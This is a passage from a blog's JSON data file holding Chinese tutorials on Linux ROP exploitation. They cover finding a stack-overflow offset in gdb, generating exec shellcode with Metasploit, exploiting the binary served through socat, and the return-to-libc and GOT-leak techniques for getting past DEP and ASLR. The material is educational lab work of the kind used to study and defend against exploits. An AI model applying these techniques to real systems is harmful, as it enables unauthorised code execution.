EXEC:./level1`，这里同样要重新寻找对应的返回地址，因此第一次可以输入一个错误的 Shellcode，然后同样使用`gdb level1 core.xxxxx` 命令来调试 coredump 文件，显示具体的返回地址，再重新修改 shellcode 中的返回内容。\n\n![执行成功](/img/rop_execute.png)\n\n# 后记\n\n虽然这个教程篇幅不长，但是自己复现整个过程却充满了坎坷，断断续续花了两个月的时间，所幸第一次总是艰难的，后续会应该轻松很多吧，加油！\n\n# 参考文章列表\n\n[VirtualBox虚拟机和Mac或Win主机之间网络相互通信](https://segmentfault.com/a/1190000012756506)\n\n[一步一步学ROP](https://github.com/zhengmin1989/MyArticles/tree/master/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP)\n\n[一步一步学ROP 镜像文 ](http://drops.2xss.cc/?chamd5#!/drops/595.%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x86%E7%AF%87)\n\n[Introduction to Return Oriented Programming (ROP)](https://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/)\n\n[栈溢出漏洞的利用和缓解](https://www.cnblogs.com/pannengzhi/p/exploit-the-stack.html)\n\n[StackOverFlow之Ret2ShellCode详解](https://www.freebuf.com/vuls/179724.html)\n\n[常用GDB指令](https://www.jianshu.com/p/b7896e9afeb7)","slug":"ROP-part1","published":1,"comments":1,"layout":"post","photos":[],"_id":"clypxqmmw0017xrn56mb5hyox","content":"<h1 id=\"基础\"><a href=\"#基础\" class=\"headerlink\" title=\"基础\"></a>基础</h1><p>ROP(Return-oriented programming) 是一种通过覆盖堆栈 (Stack) 内容来实现控制返回地址实现执行自定义代码的漏洞利用手段。目前比较流行的教程是蒸米写的Linux ROP系列，本文以此为基础，综合其他文章来详细的讲解Linux ROP利用国产。</p>\n<h1 id=\"构造虚拟机环境\"><a href=\"#构造虚拟机环境\" class=\"headerlink\" title=\"构造虚拟机环境\"></a>构造虚拟机环境</h1><p>测试过程中需要x86&#x2F;x64两个环境的Linux系统，因此一般物理机测试起来比较麻烦，可以通过安装虚拟机来构造对应的测试环境。这里我使用 VirtualBox 来安装不同的测试环境，此外我选择基于 Alpine Linux 搭建测试环境，原因是 Alpine Linux 的镜像相对比较小，而且里面是基于 musl libc 实现了系统调用，意味着网上教程中的很多地方需要自己进行针对性的修改，这也是一个挑战。</p>\n<h2 id=\"虚拟机网络配置\"><a href=\"#虚拟机网络配置\" class=\"headerlink\" title=\"虚拟机网络配置\"></a>虚拟机网络配置</h2><p>为了方便测试，我选择使用 SSH 连接 Linux 主机执行命令，而不是从 VirtualBox 的界面，无法快捷的复制粘贴内外内容。使用 SSH 时需要有一个条件是物理机主动连接到虚拟机，但是默认的虚拟机环境采用 NAT 模式，虚拟机能够访问外网但是物理机无法访问虚拟机，这时可以额外添加一个 Host Only 网络来连接虚拟机。</p>\n<h2 id=\"Alpine-Linux-基础环境搭建\"><a href=\"#Alpine-Linux-基础环境搭建\" class=\"headerlink\" title=\"Alpine Linux 基础环境搭建\"></a>Alpine Linux 基础环境搭建</h2><p>需要手动安装 gcc 和 libc-dev 库提供基础编译环境，安装 gdb 提供调试功能。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apk add libc-dev gcc gdb</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"静态分析代码\"><a href=\"#静态分析代码\" class=\"headerlink\" title=\"静态分析代码\"></a>静态分析代码</h1><h2 id=\"反汇编程序\"><a href=\"#反汇编程序\" class=\"headerlink\" title=\"反汇编程序\"></a>反汇编程序</h2><p>为了方便反汇编，可以将 gdb 的语法设置默认为 AT&amp;T 语法改为 Intel 语法，具体方法如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;set disassembly-flavor intel&quot; &gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"GDB-指令简介\"><a href=\"#GDB-指令简介\" class=\"headerlink\" title=\"GDB 指令简介\"></a>GDB 指令简介</h2><ul>\n<li><p><code>b[reak] &lt;行号|函数名|代码地址&gt;</code> 下断点</p>\n</li>\n<li><p><code>r[un]</code> 运行代码</p>\n</li>\n<li><p><code>c[continue]</code> 继续运行</p>\n</li>\n<li><p><code>s/n</code> Step into 单步跟踪进入&#x2F;Step Over 单步跟踪</p>\n</li>\n<li><p><code>si/ni</code> 汇编指令集 <code>s/n</code> </p>\n</li>\n<li><p><code>p [varialbe/register]</code> 打印变量&#x2F;寄存器</p>\n</li>\n</ul>\n<h2 id=\"Debug-教程\"><a href=\"#Debug-教程\" class=\"headerlink\" title=\"Debug 教程\"></a>Debug 教程</h2><p>使用 <code>gdb level1</code> 来加载程序，然后调用 <code>disas vulnerable_function</code> 来反汇编存在漏洞的函数。输入 <code>layout asm</code> 分屏显示汇编代码， <code>b  vulnerable_function</code> 下断点，然后 <code>r</code> 开始运行程序，<code>p $eip</code> 打印当前 EIP 寄存器地址。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x00001220 &lt;+0&gt;:\t    push   ebp</span><br><span class=\"line\">0x00001221 &lt;+1&gt;:\t    mov    ebp,esp</span><br><span class=\"line\">0x00001223 &lt;+3&gt;:\t    push   ebx</span><br><span class=\"line\">0x00001224 &lt;+4&gt;:\t    sub    esp,0x84</span><br><span class=\"line\"></span><br><span class=\"line\">0x0000122a &lt;+10&gt;:\tcall   0x1218 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class=\"line\">0x0000122f &lt;+15&gt;:\tadd    eax,0x2d99</span><br><span class=\"line\">0x00001234 &lt;+20&gt;:\tsub    esp,0x4          // &lt;----a</span><br><span class=\"line\"></span><br><span class=\"line\">0x00001237 &lt;+23&gt;:\tpush   0x100             // 256</span><br><span class=\"line\">0x0000123c &lt;+28&gt;:\tlea    edx,[ebp-0x88]    // -+</span><br><span class=\"line\">0x00001242 &lt;+34&gt;:\tpush   edx               // -+--  ebp-0x88为buf地址</span><br><span class=\"line\">0x00001243 &lt;+35&gt;:\tpush   0x0               // STDIN_FILENO</span><br><span class=\"line\">0x00001245 &lt;+37&gt;:\tmov    ebx,eax</span><br><span class=\"line\">0x00001247 &lt;+39&gt;:\tcall   0x1040 &lt;read@plt&gt; // 调用read函数</span><br><span class=\"line\"></span><br><span class=\"line\">0x0000124c &lt;+44&gt;:\tadd    esp,0x10</span><br><span class=\"line\">0x0000124f &lt;+47&gt;:\tnop</span><br><span class=\"line\">0x00001250 &lt;+48&gt;:\tmov    ebx,DWORD PTR [ebp-0x4]</span><br><span class=\"line\">0x00001253 &lt;+51&gt;:\tleave                    // mov esp,ebp; pop ebp;</span><br><span class=\"line\">0x00001254 &lt;+52&gt;:\tret                      // pop eip; jump eip;</span><br><span class=\"line\"></span><br><span class=\"line\">-----------------------</span><br><span class=\"line\"></span><br><span class=\"line\">0x0000126f &lt;+26&gt;:\tcall   0x1220 &lt;vulnerable_function&gt; // push eip; jump XX;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>汇编代码中有一个函数 <code>__x86.get_pc_thunk.ax</code> 的调用，在此可以暂时忽略这段代码，与 EOP 利用无关，没有任何影响。关于这个函数的详细解释，参考 <a href=\"https://cloud.tencent.com/developer/ask/91473\">《什么是__i686.get_pc_thunk.bx？我们为什么需要调用这个？》</a> 一文。</p>\n<h2 id=\"堆栈分析\"><a href=\"#堆栈分析\" class=\"headerlink\" title=\"堆栈分析\"></a>堆栈分析</h2><p>下面先从理论上对堆栈情况分析一下。首先要注意的是，esp 指针是指向栈顶，即当前已经使用的空间。执行汇编指令到 a 处，堆栈如下：</p>\n<p><img src=\"/img/rop_stack_1.png\" alt=\"初始堆栈\"></p>\n<p>通过<code>si</code>和<code>ni</code>指令执行到read函数之前，此时的堆栈如下图2：</p>\n<p><img src=\"/img/rop_stack_2.png\" alt=\"调用read函数前的堆栈\"></p>\n<p>通过调试发现此时堆栈中有两个空位 0xbffffcb0 和 0xbffffc2c，猜测可能是多余的代码导致的。调用完 read 函数，输入内容后，进行堆栈平衡，此时堆栈变成下图：</p>\n<p><img src=\"/img/rop_stack_3.png\" alt=\"调用read函数后的堆栈\"></p>\n<p>调用指令 <code>x /8cb 0xbffffc30</code>  可以显示出输入的前 8 个字符。继续往下执行，这时候会返回，会调用 <code>leave</code> 指令再次堆栈平衡，释放函数中的临时变量，并恢复原有函数栈帧的 esp 。最后执行 <code>ret</code> 指令，至此整个执行流完毕。</p>\n<h2 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h2><p>很明显，read 函数没有对输入的内容校验长度，导致可以输入超长字符串，利用字符串覆盖 eip(0xbffffcbc) ，则我们就可以控制这个函数的返回地址，实现漏洞利用。通过计算可以得到 0xbffffcbc - 0xbffffc30 &#x3D; 0x8c，即使用 0x8c + 0x04 长度的字符串覆盖，最后的四字节就可以覆盖成功。对比原文中提供的通过脚本获取覆盖长度脚本，可以发现与我们分析的一致。</p>\n<h2 id=\"生成-Shellcode\"><a href=\"#生成-Shellcode\" class=\"headerlink\" title=\"生成 Shellcode\"></a>生成 Shellcode</h2><p>很可惜，使用教程中所提供的 shellcode 时存在问题，进程仍然 crash，不过使用 Metasploit 生成要的 Shellcode 却能够正常执行。生成 Shellcode 的具体做法如下，进入 msfconsole，使用 <code>show payloads</code> 可以看到所有支持的 payload。然后 <code>use linux/x86/exec</code> 来选用当前环境的 payload ，输入 <code>info</code> 查看当前 payload 的参数，用 <code>set CMD /bin/s</code> 来生成执行 <code>sh</code> 的 shellcode，最后使用 <code>generate</code> 命令来生成。</p>\n<h2 id=\"执行-Shellcode\"><a href=\"#执行-Shellcode\" class=\"headerlink\" title=\"执行 Shellcode\"></a>执行 Shellcode</h2><p>最初的想法是在 Alpine 中安装 pwntools 工具本地执行，但是发现安装了一系列软件后，最终因为某个库不支持 x86 环境而安装失败，相关需要安装的库如下，有需要的可以参考下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apk add --no-cache -X https://mirrors.tuna.tsinghua.edu.cn/alpine/edge/community/ capstone-dev</span><br><span class=\"line\">apk add python3 python3-dev alpine-sdk libffi-dev openssl-dev</span><br><span class=\"line\">pip install pwntools</span><br></pre></td></tr></table></figure>\n\n<p>因为 pwntools 安装失败，所以使用 socat 命令来起服务，<code>socat TCP4-LISTEN:5001,fork EXEC:./level1</code>，这里同样要重新寻找对应的返回地址，因此第一次可以输入一个错误的 Shellcode，然后同样使用<code>gdb level1 core.xxxxx</code> 命令来调试 coredump 文件，显示具体的返回地址，再重新修改 shellcode 中的返回内容。</p>\n<p><img src=\"/img/rop_execute.png\" alt=\"执行成功\"></p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p>虽然这个教程篇幅不长，但是自己复现整个过程却充满了坎坷，断断续续花了两个月的时间，所幸第一次总是艰难的，后续会应该轻松很多吧，加油！</p>\n<h1 id=\"参考文章列表\"><a href=\"#参考文章列表\" class=\"headerlink\" title=\"参考文章列表\"></a>参考文章列表</h1><p><a href=\"https://segmentfault.com/a/1190000012756506\">VirtualBox虚拟机和Mac或Win主机之间网络相互通信</a></p>\n<p><a href=\"https://github.com/zhengmin1989/MyArticles/tree/master/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP\">一步一步学ROP</a></p>\n<p><a href=\"http://drops.2xss.cc/?chamd5#!/drops/595.%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x86%E7%AF%87\">一步一步学ROP 镜像文 </a></p>\n<p><a href=\"https://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/\">Introduction to Return Oriented Programming (ROP)</a></p>\n<p><a href=\"https://www.cnblogs.com/pannengzhi/p/exploit-the-stack.html\">栈溢出漏洞的利用和缓解</a></p>\n<p><a href=\"https://www.freebuf.com/vuls/179724.html\">StackOverFlow之Ret2ShellCode详解</a></p>\n<p><a href=\"https://www.jianshu.com/p/b7896e9afeb7\">常用GDB指令</a></p>\n","excerpt":"","more":"<h1 id=\"基础\"><a href=\"#基础\" class=\"headerlink\" title=\"基础\"></a>基础</h1><p>ROP(Return-oriented programming) 是一种通过覆盖堆栈 (Stack) 内容来实现控制返回地址实现执行自定义代码的漏洞利用手段。目前比较流行的教程是蒸米写的Linux ROP系列，本文以此为基础，综合其他文章来详细的讲解Linux ROP利用国产。</p>\n<h1 id=\"构造虚拟机环境\"><a href=\"#构造虚拟机环境\" class=\"headerlink\" title=\"构造虚拟机环境\"></a>构造虚拟机环境</h1><p>测试过程中需要x86&#x2F;x64两个环境的Linux系统，因此一般物理机测试起来比较麻烦，可以通过安装虚拟机来构造对应的测试环境。这里我使用 VirtualBox 来安装不同的测试环境，此外我选择基于 Alpine Linux 搭建测试环境，原因是 Alpine Linux 的镜像相对比较小，而且里面是基于 musl libc 实现了系统调用，意味着网上教程中的很多地方需要自己进行针对性的修改，这也是一个挑战。</p>\n<h2 id=\"虚拟机网络配置\"><a href=\"#虚拟机网络配置\" class=\"headerlink\" title=\"虚拟机网络配置\"></a>虚拟机网络配置</h2><p>为了方便测试，我选择使用 SSH 连接 Linux 主机执行命令，而不是从 VirtualBox 的界面，无法快捷的复制粘贴内外内容。使用 SSH 时需要有一个条件是物理机主动连接到虚拟机，但是默认的虚拟机环境采用 NAT 模式，虚拟机能够访问外网但是物理机无法访问虚拟机，这时可以额外添加一个 Host Only 网络来连接虚拟机。</p>\n<h2 id=\"Alpine-Linux-基础环境搭建\"><a href=\"#Alpine-Linux-基础环境搭建\" class=\"headerlink\" title=\"Alpine Linux 基础环境搭建\"></a>Alpine Linux 基础环境搭建</h2><p>需要手动安装 gcc 和 libc-dev 库提供基础编译环境，安装 gdb 提供调试功能。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apk add libc-dev gcc gdb</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"静态分析代码\"><a href=\"#静态分析代码\" class=\"headerlink\" title=\"静态分析代码\"></a>静态分析代码</h1><h2 id=\"反汇编程序\"><a href=\"#反汇编程序\" class=\"headerlink\" title=\"反汇编程序\"></a>反汇编程序</h2><p>为了方便反汇编，可以将 gdb 的语法设置默认为 AT&amp;T 语法改为 Intel 语法，具体方法如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;set disassembly-flavor intel&quot; &gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"GDB-指令简介\"><a href=\"#GDB-指令简介\" class=\"headerlink\" title=\"GDB 指令简介\"></a>GDB 指令简介</h2><ul>\n<li><p><code>b[reak] &lt;行号|函数名|代码地址&gt;</code> 下断点</p>\n</li>\n<li><p><code>r[un]</code> 运行代码</p>\n</li>\n<li><p><code>c[continue]</code> 继续运行</p>\n</li>\n<li><p><code>s/n</code> Step into 单步跟踪进入&#x2F;Step Over 单步跟踪</p>\n</li>\n<li><p><code>si/ni</code> 汇编指令集 <code>s/n</code> </p>\n</li>\n<li><p><code>p [varialbe/register]</code> 打印变量&#x2F;寄存器</p>\n</li>\n</ul>\n<h2 id=\"Debug-教程\"><a href=\"#Debug-教程\" class=\"headerlink\" title=\"Debug 教程\"></a>Debug 教程</h2><p>使用 <code>gdb level1</code> 来加载程序，然后调用 <code>disas vulnerable_function</code> 来反汇编存在漏洞的函数。输入 <code>layout asm</code> 分屏显示汇编代码， <code>b  vulnerable_function</code> 下断点，然后 <code>r</code> 开始运行程序，<code>p $eip</code> 打印当前 EIP 寄存器地址。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x00001220 &lt;+0&gt;:\t    push   ebp</span><br><span class=\"line\">0x00001221 &lt;+1&gt;:\t    mov    ebp,esp</span><br><span class=\"line\">0x00001223 &lt;+3&gt;:\t    push   ebx</span><br><span class=\"line\">0x00001224 &lt;+4&gt;:\t    sub    esp,0x84</span><br><span class=\"line\"></span><br><span class=\"line\">0x0000122a &lt;+10&gt;:\tcall   0x1218 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class=\"line\">0x0000122f &lt;+15&gt;:\tadd    eax,0x2d99</span><br><span class=\"line\">0x00001234 &lt;+20&gt;:\tsub    esp,0x4          // &lt;----a</span><br><span class=\"line\"></span><br><span class=\"line\">0x00001237 &lt;+23&gt;:\tpush   0x100             // 256</span><br><span class=\"line\">0x0000123c &lt;+28&gt;:\tlea    edx,[ebp-0x88]    // -+</span><br><span class=\"line\">0x00001242 &lt;+34&gt;:\tpush   edx               // -+--  ebp-0x88为buf地址</span><br><span class=\"line\">0x00001243 &lt;+35&gt;:\tpush   0x0               // STDIN_FILENO</span><br><span class=\"line\">0x00001245 &lt;+37&gt;:\tmov    ebx,eax</span><br><span class=\"line\">0x00001247 &lt;+39&gt;:\tcall   0x1040 &lt;read@plt&gt; // 调用read函数</span><br><span class=\"line\"></span><br><span class=\"line\">0x0000124c &lt;+44&gt;:\tadd    esp,0x10</span><br><span class=\"line\">0x0000124f &lt;+47&gt;:\tnop</span><br><span class=\"line\">0x00001250 &lt;+48&gt;:\tmov    ebx,DWORD PTR [ebp-0x4]</span><br><span class=\"line\">0x00001253 &lt;+51&gt;:\tleave                    // mov esp,ebp; pop ebp;</span><br><span class=\"line\">0x00001254 &lt;+52&gt;:\tret                      // pop eip; jump eip;</span><br><span class=\"line\"></span><br><span class=\"line\">-----------------------</span><br><span class=\"line\"></span><br><span class=\"line\">0x0000126f &lt;+26&gt;:\tcall   0x1220 &lt;vulnerable_function&gt; // push eip; jump XX;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>汇编代码中有一个函数 <code>__x86.get_pc_thunk.ax</code> 的调用，在此可以暂时忽略这段代码，与 EOP 利用无关，没有任何影响。关于这个函数的详细解释，参考 <a href=\"https://cloud.tencent.com/developer/ask/91473\">《什么是__i686.get_pc_thunk.bx？我们为什么需要调用这个？》</a> 一文。</p>\n<h2 id=\"堆栈分析\"><a href=\"#堆栈分析\" class=\"headerlink\" title=\"堆栈分析\"></a>堆栈分析</h2><p>下面先从理论上对堆栈情况分析一下。首先要注意的是，esp 指针是指向栈顶，即当前已经使用的空间。执行汇编指令到 a 处，堆栈如下：</p>\n<p><img src=\"/img/rop_stack_1.png\" alt=\"初始堆栈\"></p>\n<p>通过<code>si</code>和<code>ni</code>指令执行到read函数之前，此时的堆栈如下图2：</p>\n<p><img src=\"/img/rop_stack_2.png\" alt=\"调用read函数前的堆栈\"></p>\n<p>通过调试发现此时堆栈中有两个空位 0xbffffcb0 和 0xbffffc2c，猜测可能是多余的代码导致的。调用完 read 函数，输入内容后，进行堆栈平衡，此时堆栈变成下图：</p>\n<p><img src=\"/img/rop_stack_3.png\" alt=\"调用read函数后的堆栈\"></p>\n<p>调用指令 <code>x /8cb 0xbffffc30</code>  可以显示出输入的前 8 个字符。继续往下执行，这时候会返回，会调用 <code>leave</code> 指令再次堆栈平衡，释放函数中的临时变量，并恢复原有函数栈帧的 esp 。最后执行 <code>ret</code> 指令，至此整个执行流完毕。</p>\n<h2 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h2><p>很明显，read 函数没有对输入的内容校验长度，导致可以输入超长字符串，利用字符串覆盖 eip(0xbffffcbc) ，则我们就可以控制这个函数的返回地址，实现漏洞利用。通过计算可以得到 0xbffffcbc - 0xbffffc30 &#x3D; 0x8c，即使用 0x8c + 0x04 长度的字符串覆盖，最后的四字节就可以覆盖成功。对比原文中提供的通过脚本获取覆盖长度脚本，可以发现与我们分析的一致。</p>\n<h2 id=\"生成-Shellcode\"><a href=\"#生成-Shellcode\" class=\"headerlink\" title=\"生成 Shellcode\"></a>生成 Shellcode</h2><p>很可惜，使用教程中所提供的 shellcode 时存在问题，进程仍然 crash，不过使用 Metasploit 生成要的 Shellcode 却能够正常执行。生成 Shellcode 的具体做法如下，进入 msfconsole，使用 <code>show payloads</code> 可以看到所有支持的 payload。然后 <code>use linux/x86/exec</code> 来选用当前环境的 payload ，输入 <code>info</code> 查看当前 payload 的参数，用 <code>set CMD /bin/s</code> 来生成执行 <code>sh</code> 的 shellcode，最后使用 <code>generate</code> 命令来生成。</p>\n<h2 id=\"执行-Shellcode\"><a href=\"#执行-Shellcode\" class=\"headerlink\" title=\"执行 Shellcode\"></a>执行 Shellcode</h2><p>最初的想法是在 Alpine 中安装 pwntools 工具本地执行，但是发现安装了一系列软件后，最终因为某个库不支持 x86 环境而安装失败，相关需要安装的库如下，有需要的可以参考下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apk add --no-cache -X https://mirrors.tuna.tsinghua.edu.cn/alpine/edge/community/ capstone-dev</span><br><span class=\"line\">apk add python3 python3-dev alpine-sdk libffi-dev openssl-dev</span><br><span class=\"line\">pip install pwntools</span><br></pre></td></tr></table></figure>\n\n<p>因为 pwntools 安装失败，所以使用 socat 命令来起服务，<code>socat TCP4-LISTEN:5001,fork EXEC:./level1</code>，这里同样要重新寻找对应的返回地址，因此第一次可以输入一个错误的 Shellcode，然后同样使用<code>gdb level1 core.xxxxx</code> 命令来调试 coredump 文件，显示具体的返回地址，再重新修改 shellcode 中的返回内容。</p>\n<p><img src=\"/img/rop_execute.png\" alt=\"执行成功\"></p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p>虽然这个教程篇幅不长，但是自己复现整个过程却充满了坎坷，断断续续花了两个月的时间，所幸第一次总是艰难的，后续会应该轻松很多吧，加油！</p>\n<h1 id=\"参考文章列表\"><a href=\"#参考文章列表\" class=\"headerlink\" title=\"参考文章列表\"></a>参考文章列表</h1><p><a href=\"https://segmentfault.com/a/1190000012756506\">VirtualBox虚拟机和Mac或Win主机之间网络相互通信</a></p>\n<p><a href=\"https://github.com/zhengmin1989/MyArticles/tree/master/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP\">一步一步学ROP</a></p>\n<p><a href=\"http://drops.2xss.cc/?chamd5#!/drops/595.%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x86%E7%AF%87\">一步一步学ROP 镜像文 </a></p>\n<p><a href=\"https://ketansingh.net/Introduction-to-Return-Oriented-Programming-ROP/\">Introduction to Return Oriented Programming (ROP)</a></p>\n<p><a href=\"https://www.cnblogs.com/pannengzhi/p/exploit-the-stack.html\">栈溢出漏洞的利用和缓解</a></p>\n<p><a href=\"https://www.freebuf.com/vuls/179724.html\">StackOverFlow之Ret2ShellCode详解</a></p>\n<p><a href=\"https://www.jianshu.com/p/b7896e9afeb7\">常用GDB指令</a></p>\n"},{"title":"从0开始学习Linux ROP利用-part2","date":"2018-02-12T20:13:31.000Z","updated":"2018-03-09T23:18:23.000Z","_content":"\n# ROP攻击: 使用 Return-to-libc 绕过 DEP 防护\n\n## 使用 Ubuntu cloud image 构建基本测试环境\n\n这时我遇到了一个坑，发现基于 Alpine Linux 测试始终不通过，因此不得不再次改用了 Ubuntu 进行测试。猜测应该是因为 Alpine Linux 不再基于 glibc，利用方法可能有所改变。\n\n本来想选择的镜像是 Ubuntu Cloud Image，具体的版本是 Ubuntu xenial 16.04 LTS。Ubuntu Cloud Image 所提供的镜像比较精简，一般大小只有 200MB 多，适合快速下载，同时也提供了 Vmware 的 vmdk 文件下载，比较方便部署，但是具体使用的时候仍然无法支持使用 VirtualBox 启动通过，因此此处仅作一个想法记录下来。具体的安装方法不再叙述，同样给虚拟机分配了两个网卡，以方便联网和联入测试。\n\n## DEP 防护原理\n\n前一攻击方法使用的是直接将 Shellcode 写到栈然后执行，通过在编译的时候增加 stack-protector 参数，使得程序栈无法直接执行代码来实现防护。\n\n## 调用 System 函数的原理\n\n伪造堆栈调用 system 函数之前所需要的内容，使得 vulnerable_function 返回时的 jump 变成了实际对 system 函数的调用。这边最理想的情况是调用完 system 函数后，如果 system 函数返回，则能够正常返回到 vulnerable_function 之前的返回地址，程序运行不会出现任何异常。\n\n首先再次回顾下此时的堆栈:\n\n![调用read函数前的堆栈](/img/rop_stack_2.png)\n\n实际上我们现在能做的是从 0xbffffc30 开始来操纵栈中的数据内容，本来函数是通过 jmp eip 来返回到 main 函数的，但是通过更改 0xbffffcbc 处的地址为 system 函数的地址，使得这个返回变成了跳转入指定的函数调用中，并且此时 0xbffffcc4 处地址作为了改函数的调用参数，而 0xbffffcc0 处则是 system 函数的返回地址，通过修改此处地址的内容，可以确保 system 函数退出时程序不崩溃出现异常。\n\n![调用 system 函数前的堆栈](/img/rop_stack_4.png)\n\n## 总结\n\n由此可见，Return to libc 技术，就是在栈区域无法直接执行代码的时候，通过返回到 glibc 中的函数，并传入 glibc 中的参数来执行指定函数。由此也可以看到，这种方法的前提是 glibc 中存在想要执行的函数与对应的参数。\n\n# ROP攻击: 绕过 DEP 和 ASLR 保护\n\n增加了 ASLR 保护后，最明显的改变是不再有固定地址的函数。所有系统函数的地址均是未知的，不再能够直接调用到这些函数了。但是对应仍然存在一定的绕过方法。其基本思想是找到（泄露）一个已知函数的实际地址，然后通过这个函数和我们需要执行函数的偏移计算出所需要实际调用的函数地址，那么这个问题就转换为如何找到（泄露）一个已知函数的实际地址了。\n\n关于 Linux 的 PLT 和 GOT，本来想写一篇相关的文章，但是看到了 [海枫](https://blog.csdn.net/linyt) 写的相关文章之后，顿时觉得完全没有必要了，他已经将相关的知识点讲解的非常清楚。\n\n这里具体使用的方法是依据程序中的 write@plt 函数泄露了 write 函数的地址，为了达到这个目标，需要在栈上伪造了对 write@plt 函数的调用，栈布局如下图所示，这里面通过 write 将 write.got 中存储 write 函数地址的内容写入到 stdout 中，然后解析返回结果，就成功获取了 write 函数的地址。后续的利用过程则和前文中的 Return-to-libc 一致，这里不再赘述。\n\n![调用 write 函数前的堆栈](/img/rop_stack_5.png)\n\n# 参考列表\n\n[压栈， 跳转，执行，返回：从汇编看函数调用](https://www.jianshu.com/p/594357dff57e)\n[Linux下pwn从入门到放弃](https://xz.aliyun.com/t/1803)\n[Exploit Mitigation Techniques - Data Execution Prevention (DEP)](https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634)\n[https://www.jianshu.com/p/ef58e6b0ebef?utm_campaign=maleskine&utm_content=note&utm_medium=seo_notes&utm_source=recommendation](Linux (x86) Exploit 开发系列教程之八 绕过 ASLR -- 第三部分)\n[got、plt表介绍](https://introspelliam.github.io/2017/08/03/pwn/got%E3%80%81plt%E8%A1%A8%E4%BB%8B%E7%BB%8D/)\n[聊聊Linux动态链接中的PLT和GOT（１）——何谓PLT与GOT](https://blog.csdn.net/linyt/article/details/51635768)","source":"_posts/ROP-part2.md","raw":"title: 从0开始学习Linux ROP利用-part2\ndate: 2018-02-12 20:13:31\nupdated: 2018-03-09 23:18:23\ntags: [\"Linux\", \"Exploit\"]\n---\n\n# ROP攻击: 使用 Return-to-libc 绕过 DEP 防护\n\n## 使用 Ubuntu cloud image 构建基本测试环境\n\n这时我遇到了一个坑，发现基于 Alpine Linux 测试始终不通过，因此不得不再次改用了 Ubuntu 进行测试。猜测应该是因为 Alpine Linux 不再基于 glibc，利用方法可能有所改变。\n\n本来想选择的镜像是 Ubuntu Cloud Image，具体的版本是 Ubuntu xenial 16.04 LTS。Ubuntu Cloud Image 所提供的镜像比较精简，一般大小只有 200MB 多，适合快速下载，同时也提供了 Vmware 的 